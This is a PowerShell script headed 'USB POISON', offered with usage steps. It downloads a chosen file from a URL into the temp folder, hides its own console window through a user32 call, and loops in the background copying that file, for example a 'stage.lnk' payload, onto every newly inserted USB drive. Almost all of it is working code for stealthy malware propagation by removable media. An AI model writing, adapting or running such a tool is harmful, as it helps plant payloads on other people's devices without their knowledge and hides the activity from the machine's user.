<# ====================== USB POISON ==========================

SYNOPSIS
This script runs quietly in the background waiting for new USB storage devices.
When a new device connects, this script will copy a desired file to the root of newly connected drive.

USAGE
1. REPLACE the example file URL with your own.
2. Run the script
3. Your desired file will be downloaded to the 'temp' directory
4. When a new USB storage device is connected the file is copied
5. Use Task Manager to exit the script

#>

# Replace with your file direct download / raw link
$fileURL = "$DLurl"
$fileToCopy = "$File" # if zip is downloaded

if ($fileURL.length -eq 0){
  $fileURL = read-host "Enter direct download file URL "
}

if ($fileToCopy.length -eq 0){
  $fileToCopy = read-host "Enter the filename (eg. stage.lnk) "
}

# Hidden Console (y/n)
$hidden = 'y'

If ($hidden -eq 'y'){
    Write-Host "Hiding the Window.."  -ForegroundColor Red
    sleep 1
    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
    $hwnd = (Get-Process -PID $pid).MainWindowHandle
    if($hwnd -ne [System.IntPtr]::Zero){
        $Type::ShowWindowAsync($hwnd, 0)
    }
    else{
        $Host.UI.RawUI.WindowTitle = 'hideme'
        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
        $hwnd = $Proc.MainWindowHandle
        $Type::ShowWindowAsync($hwnd, 0)
    }
}

function DownloadAndExtract-Zip {
    param ([string]$fileURL,[string]$filename)

    $filename = Split-Path -Path $fileURL -Leaf
    $tempDir = [System.IO.Path]::GetTempPath()
    $filepath = "$tempDir\$filename"

    try {
        Invoke-WebRequest -Uri $fileURL -OutFile $filepath
        Write-Host "File downloaded to $filepath"
    } catch {
        Write-Error "Failed to download file from $fileURL"
        return
    }

    if ($filename -like "*.zip") {
        Write-Host "File is a ZIP archive. Extracting contents..."

        $extractPath = $tempDir

        try {
            Add-Type -AssemblyName System.IO.Compression.FileSystem
            [System.IO.Compression.ZipFile]::ExtractToDirectory($filepath, $extractPath)
            Write-Host "Files extracted to $extractPath"
        } catch {
            Write-Error "Failed to extract the ZIP file"
        }
    } else {
        Write-Host "Downloaded file is not a ZIP archive. No extraction needed."
    }
}

DownloadAndExtract-Zip -fileURL $fileURL

while($true){
    $tempDir = [System.IO.Path]::GetTempPath()
    $fileToCopy = "$tempDir\$fileToCopy"
    $initialDrives = Get-WMIObject Win32_LogicalDisk | ? {$_.DriveType -eq 2} | select DeviceID
    while ($true){
        $currentDrives = Get-WMIObject Win32_LogicalDisk | ? {$_.DriveType -eq 2} | select DeviceID
        $newDrive = $currentDrives | Where-Object { $initialDrives.DeviceID -notcontains $_.DeviceID}  
        if ($newDrive){
            $drive = Get-WMIObject Win32_LogicalDisk | ? {$_.DriveType -eq 2} | Where-Object { $initialDrives.DeviceID -notcontains $_.DeviceID}
            $driveletter = ($drive.DeviceID + '/')
            Copy-Item -Path $fileToCopy -Destination $driveletter
            sleep 1
            break
        }
        sleep 1
    }
    
    sleep 1
}
